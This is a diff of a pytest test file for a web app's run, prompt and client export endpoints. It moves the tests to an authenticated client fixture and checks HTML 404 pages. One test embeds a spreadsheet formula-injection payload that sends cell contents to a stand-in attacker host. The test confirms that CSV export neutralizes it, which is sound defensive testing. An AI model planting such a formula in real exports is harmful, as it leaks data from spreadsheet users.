@@ -29,7 +29,7 @@ EXPORT_MEDIA_TYPES = {
 }
 
 
-def _trigger_run(client: TestClient, prompt_id: int, seed: dict, *, payload: RawResponsePayload | None = None) -> int:
+def _trigger_run(authed_client: TestClient, prompt_id: int, seed: dict, *, payload: RawResponsePayload | None = None) -> int:
     """POST a run through FakeAdapter (never a real provider) and return the created run id."""
     FakeAdapter.payload_to_return = payload or RawResponsePayload(
         raw_payload={"answer": "test raw payload"},
@@ -43,7 +43,7 @@ def _trigger_run(client: TestClient, prompt_id: int, seed: dict, *, payload: Raw
         search_queries=["test search query"],
         token_usage={"input_tokens": 3, "output_tokens": 2},
     )
-    response = client.post(
+    response = authed_client.post(
         f"/prompts/{prompt_id}/runs",
         data={"model_id": seed["model"].id, "market_id": seed["market"].id},
         follow_redirects=False,
@@ -57,11 +57,11 @@ def _trigger_run(client: TestClient, prompt_id: int, seed: dict, *, payload: Raw
 
 @pytest.mark.parametrize("format", ["csv", "xlsx", "json"])
 @pytest.mark.parametrize("content", ["answer", "raw", "full"])
-def test_run_export_matrix(client: TestClient, seed: dict, sample_prompt: Prompt, format: str, content: str):
+def test_run_export_matrix(authed_client: TestClient, seed: dict, sample_prompt: Prompt, format: str, content: str):
     """All 9 format x content combinations return 200 with the right shape."""
-    run_id = _trigger_run(client, sample_prompt.id, seed)
+    run_id = _trigger_run(authed_client, sample_prompt.id, seed)
 
-    response = client.get(f"/runs/{run_id}/export", params={"format": format, "content": content})
+    response = authed_client.get(f"/runs/{run_id}/export", params={"format": format, "content": content})
 
     assert response.status_code == 200
     assert response.headers["content-type"].startswith(EXPORT_MEDIA_TYPES[format])
@@ -85,17 +85,18 @@ def test_run_export_matrix(client: TestClient, seed: dict, sample_prompt: Prompt
         assert ("search_queries" in data[0]) == (content in ("answer", "full"))
 
 
-def test_run_export_404_for_missing_run(client: TestClient):
-    response = client.get("/runs/999999/export")
+def test_run_export_404_for_missing_run(authed_client: TestClient):
+    """A plain-link GET (not /api/*) gets the rendered HTML error page, not raw structured JSON."""
+    response = authed_client.get("/runs/999999/export")
     assert response.status_code == 404
-    assert response.json()["error_code"] == "run_not_found"
+    assert "Run not found" in response.text
 
 
-def test_run_export_xlsx_raw_payload_truncates_at_excel_cell_limit(client: TestClient, seed: dict, sample_prompt: Prompt):
+def test_run_export_xlsx_raw_payload_truncates_at_excel_cell_limit(authed_client: TestClient, seed: dict, sample_prompt: Prompt):
     """A raw_payload that serializes past Excel's ~32,767-char cell limit is truncated, not raised."""
     huge_payload = {"huge_field": "x" * 40000}
     run_id = _trigger_run(
-        client,
+        authed_client,
         sample_prompt.id,
         seed,
         payload=RawResponsePayload(
@@ -103,7 +104,7 @@ def test_run_export_xlsx_raw_payload_truncates_at_excel_cell_limit(client: TestC
         ),
     )
 
-    response = client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "raw"})
+    response = authed_client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "raw"})
     assert response.status_code == 200
 
     raw_sheet = load_workbook(io.BytesIO(response.content))["RawPayload"]
@@ -113,11 +114,11 @@ def test_run_export_xlsx_raw_payload_truncates_at_excel_cell_limit(client: TestC
     assert cell_value.endswith("[truncated — use format=json for full payload]")
 
 
-def test_run_export_csv_neutralizes_formula_injection(client: TestClient, seed: dict, sample_prompt: Prompt):
+def test_run_export_csv_neutralizes_formula_injection(authed_client: TestClient, seed: dict, sample_prompt: Prompt):
     """A rendered_text starting with '=' must not reach runs.csv as a live formula (CSV/formula injection)."""
     formula_payload = '=HYPERLINK("http://evil.example/"&A1,"Click me")'
     run_id = _trigger_run(
-        client,
+        authed_client,
         sample_prompt.id,
         seed,
         payload=RawResponsePayload(
@@ -125,7 +126,7 @@ def test_run_export_csv_neutralizes_formula_injection(client: TestClient, seed: 
         ),
     )
 
-    response = client.get(f"/runs/{run_id}/export", params={"format": "csv"})
+    response = authed_client.get(f"/runs/{run_id}/export", params={"format": "csv"})
     zf = zipfile.ZipFile(io.BytesIO(response.content))
     row = next(csv.DictReader(io.StringIO(zf.read("runs.csv").decode())))
 
@@ -133,11 +134,11 @@ def test_run_export_csv_neutralizes_formula_injection(client: TestClient, seed: 
     assert not row["rendered_text"].startswith(("=", "+", "-", "@"))
 
 
-def test_run_export_xlsx_strips_control_characters_instead_of_crashing(client: TestClient, seed: dict, sample_prompt: Prompt):
+def test_run_export_xlsx_strips_control_characters_instead_of_crashing(authed_client: TestClient, seed: dict, sample_prompt: Prompt):
     """A control character in provider output must not crash build_xlsx with openpyxl's IllegalCharacterError."""
     dirty_text = "Answer contains a stray control char: \x01 right here."
     run_id = _trigger_run(
-        client,
+        authed_client,
         sample_prompt.id,
         seed,
         payload=RawResponsePayload(
@@ -145,7 +146,7 @@ def test_run_export_xlsx_strips_control_characters_instead_of_crashing(client: T
         ),
     )
 
-    response = client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "full"})
+    response = authed_client.get(f"/runs/{run_id}/export", params={"format": "xlsx", "content": "full"})
 
     assert response.status_code == 200
     wb = load_workbook(io.BytesIO(response.content))
@@ -157,10 +158,10 @@ def test_run_export_xlsx_strips_control_characters_instead_of_crashing(client: T
 # --- Prompt scope --------------------------------------------------------
 
 
-def test_prompt_export_versions_current_vs_all(client: TestClient, seed: dict, sample_prompt: Prompt):
-    run_v1 = _trigger_run(client, sample_prompt.id, seed)
+def test_prompt_export_versions_current_vs_all(authed_client: TestClient, seed: dict, sample_prompt: Prompt):
+    run_v1 = _trigger_run(authed_client, sample_prompt.id, seed)
 
-    edit_response = client.post(
+    edit_response = authed_client.post(
         f"/prompts/{sample_prompt.id}/edit",
         data={"text": "Updated question text?", "market_id": seed["market"].id, "topic": "", "is_active": "true"},
         follow_redirects=False,
@@ -168,44 +169,44 @@ def test_prompt_export_versions_current_vs_all(client: TestClient, seed: dict, s
     assert edit_response.status_code == 303
     prompt_v2_id = int(edit_response.headers["location"].rsplit("/", 1)[-1])
 
-    run_v2 = _trigger_run(client, prompt_v2_id, seed)
+    run_v2 = _trigger_run(authed_client, prompt_v2_id, seed)
 
-    current = json.loads(client.get(f"/prompts/{prompt_v2_id}/runs/export", params={"format": "json"}).content)
+    current = json.loads(authed_client.get(f"/prompts/{prompt_v2_id}/runs/export", params={"format": "json"}).content)
     assert {row["id"] for row in current} == {run_v2}
 
     all_versions = json.loads(
-        client.get(f"/prompts/{prompt_v2_id}/runs/export", params={"format": "json", "versions": "all"}).content
+        authed_client.get(f"/prompts/{prompt_v2_id}/runs/export", params={"format": "json", "versions": "all"}).content
     )
     assert {row["id"] for row in all_versions} == {run_v1, run_v2}
     assert {row["prompt_version"] for row in all_versions} == {1, 2}
 
 
-def test_prompt_export_404_for_missing_prompt(client: TestClient):
-    response = client.get("/prompts/999999/runs/export")
+def test_prompt_export_404_for_missing_prompt(authed_client: TestClient):
+    response = authed_client.get("/prompts/999999/runs/export")
     assert response.status_code == 404
-    assert response.json()["error_code"] == "prompt_not_found"
+    assert "Prompt not found" in response.text
 
 
-def test_prompt_export_with_no_runs_is_valid_and_empty(client: TestClient, db_session: Session, seed: dict, sample_prompt: Prompt):
+def test_prompt_export_with_no_runs_is_valid_and_empty(authed_client: TestClient, db_session: Session, seed: dict, sample_prompt: Prompt):
     empty_prompt = Prompt(prompt_set_id=sample_prompt.prompt_set_id, text="Never run", market_id=seed["market"].id)
     db_session.add(empty_prompt)
     db_session.commit()
     db_session.refresh(empty_prompt)
 
-    csv_response = client.get(f"/prompts/{empty_prompt.id}/runs/export", params={"format": "csv"})
+    csv_response = authed_client.get(f"/prompts/{empty_prompt.id}/runs/export", params={"format": "csv"})
     assert csv_response.status_code == 200
     names = zipfile.ZipFile(io.BytesIO(csv_response.content)).namelist()
     assert names == ["runs.csv", "citations.csv", "search_queries.csv"]
 
-    json_response = client.get(f"/prompts/{empty_prompt.id}/runs/export", params={"format": "json"})
+    json_response = authed_client.get(f"/prompts/{empty_prompt.id}/runs/export", params={"format": "json"})
     assert json.loads(json_response.content) == []
 
 
 # --- Client scope --------------------------------------------------------
 
 
-def test_client_export_spans_multiple_prompt_sets(client: TestClient, db_session: Session, seed: dict, sample_prompt: Prompt):
-    run_1 = _trigger_run(client, sample_prompt.id, seed)
+def test_client_export_spans_multiple_prompt_sets(authed_client: TestClient, db_session: Session, seed: dict, sample_prompt: Prompt):
+    run_1 = _trigger_run(authed_client, sample_prompt.id, seed)
 
     client_id = db_session.get(PromptSet, sample_prompt.prompt_set_id).client_id
     other_set = PromptSet(client_id=client_id, name="Second Set")
@@ -216,24 +217,24 @@ def test_client_export_spans_multiple_prompt_sets(client: TestClient, db_session
     db_session.add(other_prompt)
     db_session.commit()
     db_session.refresh(other_prompt)
-    run_2 = _trigger_run(client, other_prompt.id, seed)
+    run_2 = _trigger_run(authed_client, other_prompt.id, seed)
 
-    data = json.loads(client.get(f"/clients/{client_id}/runs/export", params={"format": "json"}).content)
+    data = json.loads(authed_client.get(f"/clients/{client_id}/runs/export", params={"format": "json"}).content)
     assert {row["id"] for row in data} == {run_1, run_2}
     assert {row["prompt_set_name"] for row in data} == {"Test Set", "Second Set"}
 
 
-def test_client_export_404_for_missing_client(client: TestClient):
-    response = client.get("/clients/999999/runs/export")
+def test_client_export_404_for_missing_client(authed_client: TestClient):
+    response = authed_client.get("/clients/999999/runs/export")
     assert response.status_code == 404
-    assert response.json()["error_code"] == "client_not_found"
+    assert "Client not found" in response.text
 
 
-def test_client_export_with_no_runs_is_valid_and_empty(client: TestClient, db_session: Session):
-    empty_client = Client(name="Empty Client", slug="empty-client")
+def test_client_export_with_no_runs_is_valid_and_empty(authed_client: TestClient, db_session: Session):
+    empty_client = Client(name="Empty Client", slug="empty-authed_client")
     db_session.add(empty_client)
     db_session.commit()
     db_session.refresh(empty_client)
 
-    response = client.get(f"/clients/{empty_client.id}/runs/export", params={"format": "json"})
+    response = authed_client.get(f"/clients/{empty_client.id}/runs/export", params={"format": "json"})
     assert json.loads(response.content) == []
